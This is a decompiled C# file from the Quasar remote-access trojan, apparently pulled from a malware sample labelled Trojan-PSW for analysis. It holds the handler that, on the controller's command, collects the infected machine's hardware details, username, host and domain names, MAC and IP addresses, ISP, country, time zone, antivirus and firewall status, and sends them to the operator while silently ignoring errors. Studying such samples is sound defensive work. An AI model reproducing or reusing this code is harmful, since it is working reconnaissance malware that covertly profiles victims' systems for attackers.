// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Messages.SystemInformationHandler
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.Helper;
using Quasar.Client.IO;
using Quasar.Client.IpGeoLocation;
using Quasar.Client.User;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;

namespace Quasar.Client.Messages
{
  public class SystemInformationHandler : IMessageProcessor
  {
    public bool CanExecute(IMessage message) => message is GetSystemInfo;

    public bool CanExecuteFrom(ISender sender) => true;

    public void Execute(ISender sender, IMessage message)
    {
      if (!(message is GetSystemInfo message1))
        return;
      this.Execute(sender, message1);
    }

    private void Execute(ISender client, GetSystemInfo message)
    {
      try
      {
        IPGlobalProperties globalProperties = IPGlobalProperties.GetIPGlobalProperties();
        string str1 = !string.IsNullOrEmpty(globalProperties.DomainName) ? globalProperties.DomainName : "-";
        string str2 = !string.IsNullOrEmpty(globalProperties.HostName) ? globalProperties.HostName : "-";
        GeoInformation geoInformation = GeoInformationFactory.GetGeoInformation();
        UserAccount userAccount = new UserAccount();
        List<Tuple<string, string>> tupleList = new List<Tuple<string, string>>()
        {
          new Tuple<string, string>("Processor (CPU)", HardwareDevices.CpuName),
          new Tuple<string, string>("Memory (RAM)", string.Format("{0} MB", (object) HardwareDevices.TotalPhysicalMemory)),
          new Tuple<string, string>("Video Card (GPU)", HardwareDevices.GpuName),
          new Tuple<string, string>("Username", userAccount.UserName),
          new Tuple<string, string>("PC Name", SystemHelper.GetPcName()),
          new Tuple<string, string>("Domain Name", str1),
          new Tuple<string, string>("Host Name", str2),
          new Tuple<string, string>("System Drive", Path.GetPathRoot(Environment.SystemDirectory)),
          new Tuple<string, string>("System Directory", Environment.SystemDirectory),
          new Tuple<string, string>("Uptime", SystemHelper.GetUptime()),
          new Tuple<string, string>("MAC Address", HardwareDevices.MacAddress),
          new Tuple<string, string>("LAN IP Address", HardwareDevices.LanIpAddress),
          new Tuple<string, string>("WAN IP Address", geoInformation.IpAddress),
          new Tuple<string, string>("ASN", geoInformation.Asn),
          new Tuple<string, string>("ISP", geoInformation.Isp),
          new Tuple<string, string>("Antivirus", SystemHelper.GetAntivirus()),
          new Tuple<string, string>("Firewall", SystemHelper.GetFirewall()),
          new Tuple<string, string>("Time Zone", geoInformation.Timezone),
          new Tuple<string, string>("Country", geoInformation.Country)
        };
        client.Send<GetSystemInfoResponse>(new GetSystemInfoResponse()
        {
          SystemInfos = tupleList
        });
      }
      catch
      {
      }
    }
  }
}
